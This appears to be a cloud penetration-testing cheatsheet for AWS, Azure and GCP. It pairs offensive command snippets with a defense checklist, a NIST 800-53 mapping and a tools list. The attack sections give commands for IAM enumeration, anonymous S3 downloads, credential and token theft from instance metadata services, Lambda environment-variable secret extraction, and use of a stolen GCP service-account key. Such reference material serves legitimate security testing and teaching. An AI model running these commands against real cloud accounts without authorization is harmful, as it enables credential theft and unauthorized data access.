# Cloud Security Cheatsheet

> AWS, Azure, GCP — Attack & Defense Patterns
> FLLC 2026 — FU PERSON

---

## AWS Attack Surface

### IAM Enumeration
```bash
# Enumerate current identity
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-account-authorization-details

# Find overprivileged roles
aws iam simulate-principal-policy --policy-source-arn <role_arn> --action-names "*"
```

### S3 Bucket Exploitation
```bash
# Public bucket discovery
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/sensitive.txt . --no-sign-request

# Bucket policy check
aws s3api get-bucket-policy --bucket target-bucket
aws s3api get-bucket-acl --bucket target-bucket

# Common misconfigs
# - Public READ/WRITE ACL
# - Wildcard principal in bucket policy
# - Missing encryption enforcement
# - No versioning (enables silent data modification)
```

### EC2 Metadata Service (IMDS)
```bash
# v1 (no auth required — SSRF target)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# v2 (token required — harder to exploit)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### Lambda Exploitation
```bash
# Enumerate functions
aws lambda list-functions
aws lambda get-function --function-name target_func
# Download source from deployment package URL

# Environment variable extraction (creds often stored here)
aws lambda get-function-configuration --function-name target_func | grep -i "Variables"
```

---

## Azure Attack Surface

### Entra ID (Azure AD) Enumeration
```bash
# Az CLI
az login
az ad user list
az ad group list
az role assignment list
az ad app list --all

# PowerShell (AzureAD module)
Get-AzureADUser
Get-AzureADGroup
Get-AzureADServicePrincipal
```

### Storage Account Exploitation
```bash
# List storage accounts
az storage account list
az storage container list --account-name target

# Check public access
az storage container show --account-name target --name container --query publicAccess
```

### Managed Identity Abuse
```bash
# From a compromised VM with managed identity
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## GCP Attack Surface

### Service Account Key Exploitation
```bash
gcloud auth activate-service-account --key-file=stolen_key.json
gcloud projects list
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account=sa@project.iam.gserviceaccount.com
```

### Metadata Server
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

---

## Cloud Defense Checklist

| Control | AWS | Azure | GCP |
|---------|-----|-------|-----|
| MFA enforcement | IAM Policy | Conditional Access | 2SV enforcement |
| Least privilege | IAM Access Analyzer | PIM | IAM Recommender |
| Logging | CloudTrail + GuardDuty | Sentinel + Defender | Cloud Audit Logs |
| Encryption at rest | KMS + S3 default encryption | Azure Key Vault | Cloud KMS |
| Network isolation | VPC + Security Groups | NSG + Private Link | VPC + Firewall Rules |
| Secret management | Secrets Manager | Key Vault | Secret Manager |
| Container security | ECR scanning + ECS runtime | ACR + Defender for Containers | Artifact Registry + BinaryAuth |
| CSPM | Security Hub | Defender for Cloud | Security Command Center |

---

## NIST 800-53 Cloud Mapping

| Control | Description | Cloud Implementation |
|---------|-------------|---------------------|
| AC-2 | Account Management | IAM Users/Roles with lifecycle policies |
| AC-3 | Access Enforcement | Resource policies, RBAC, ABAC |
| AC-6 | Least Privilege | IAM Access Analyzer, unused permission removal |
| AU-2 | Audit Events | CloudTrail, Azure Monitor, Cloud Audit Logs |
| SC-7 | Boundary Protection | VPC, NSG, Firewall Rules, PrivateLink |
| SC-13 | Cryptographic Protection | KMS, Key Vault, Cloud KMS |
| SC-28 | Protection at Rest | Default encryption, CMK enforcement |

---

## Cloud Pentest Tools

| Tool | Purpose |
|------|---------|
| `Pacu` | AWS exploitation framework |
| `ScoutSuite` | Multi-cloud security auditing |
| `Prowler` | AWS/Azure security best practices |
| `CloudMapper` | AWS network visualization |
| `ROADtools` | Azure AD enumeration |
| `GCPBucketBrute` | GCP bucket enumeration |
| `CloudBrute` | Multi-cloud enumeration |
| `Steampipe` | SQL-based cloud resource querying |

---

**FLLC 2026** — Authorized cloud security testing only.
